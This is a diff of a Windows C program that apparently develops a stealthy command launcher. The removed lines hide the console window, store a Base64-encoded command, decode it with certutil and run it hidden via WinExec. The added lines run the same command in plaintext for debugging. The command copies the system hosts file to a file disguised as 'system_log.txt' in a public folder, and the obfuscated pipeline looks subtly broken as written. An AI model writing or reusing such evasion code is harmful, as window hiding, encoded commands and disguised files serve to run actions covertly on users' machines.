@@ -3,26 +3,23 @@
 #include <stdlib.h>
 
 int main() {
-    // Hide console window
-    HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, SW_HIDE);
+    // Hide console window (Temporarily disabled for debugging)
+    // HWND hwnd = GetConsoleWindow();
+    // ShowWindow(hwnd, SW_HIDE);
 
-    // Correct Base64 encoded command (your verified encoding)
-    char encodedCmd[] = "Y29weSBDOlxXaW5kb3dzXFN5c3RlbTMyXGRyaXZlcnNcXGV0Y1xob3N0"
-                        "cyBDOlxVc2Vyc1xQdWJsaWNcc3lzdGVtX2xvZy50eHQ=";
+    // Command to execute (Manually verified working)
+    char finalCmd[] = "cmd.exe /c copy C:\\Windows\\System32\\drivers\\etc\\hosts C:\\Users\\Public\\system_log.txt";
 
-    // Construct decoding and execution command
-    char finalCmd[512];
-    snprintf(finalCmd, sizeof(finalCmd),
-        "cmd.exe /c echo %s | certutil -decode - temp_decoded.txt && cmd.exe /c temp_decoded.txt",
-        encodedCmd);
-
-    // Debugging: Print the decoded command before execution
+    // Debugging: Print command before execution
     printf("Executing: %s\n", finalCmd);
     system("pause");  // Keep console open for debugging
 
-    // Execute the obfuscated command
-    WinExec(finalCmd, SW_HIDE);
+    // Execute the command using system() instead of WinExec
+    int result = system(finalCmd);
+
+    // Debugging: Print result of system() execution
+    printf("system() result: %d\n", result);
+    system("pause");
 
     return 0;
 }
